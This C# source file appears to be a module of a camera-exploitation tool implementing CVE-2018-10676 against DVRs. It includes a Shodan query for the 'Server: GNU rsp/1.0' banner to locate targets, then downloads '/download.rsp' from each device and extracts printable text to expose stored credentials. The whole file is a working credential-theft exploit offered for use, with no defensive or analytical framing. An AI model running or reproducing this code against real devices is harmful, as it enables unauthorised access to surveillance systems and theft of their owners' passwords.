using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using ExploitMaker;

namespace Exploits
{
    public class CVE_2018_10676 : Exploit
    {
        public override string ShodanSearchQuery => "Server: GNU rsp/1.0";

        public override string Description => CommonName + ": Gets DVR Credentials in many vendors that responds using the banner 'Server: GNU rsp/1.0'";

        public override string CommonName => "CVE-2018-10676";

        public override Credencial Run(Camera cam)
        {
            //This is an aproximate size
            var dataLength = 66000;
            try
            {
                using (var result = ConnectionHelper.DownloadHttpFile(cam.Host, cam.Port, cam.UrlHttp + "/download.rsp", dataLength))
                {
                    if (result == null)
                    {
                        var notReachMsg = string.Format(Phrases.IP_Camera_Is_Not_Reachable, cam.Address, CommonName);
                        throw new ExploitFailException(notReachMsg, cam, CommonName);
                    }

                    var bytes = BinaryHelper.ReadBytes(result);
                    var fullFileString = Encoding.UTF8.GetString(bytes);
                    var str = CleanString(fullFileString);
                    return new Credencial("","", Phrases.Check_Message_For_Password + ":" + str);
                }
            }
            catch (EndOfStreamException)
            {
                return null;
            }
        }

        private string CleanString(string content)
        {
            var ascciPrinteable = new StringBuilder();
            foreach (var c in content)
            {
                if (c >= 32 && c <= 126)
                    ascciPrinteable.Insert(ascciPrinteable.Length, c);
                else if (c == 0)
                {
                    ascciPrinteable.Insert(ascciPrinteable.Length, " ");
                }
            }
            return  Regex.Replace(ascciPrinteable.ToString(), @"\s+", " ");
        }
    }
}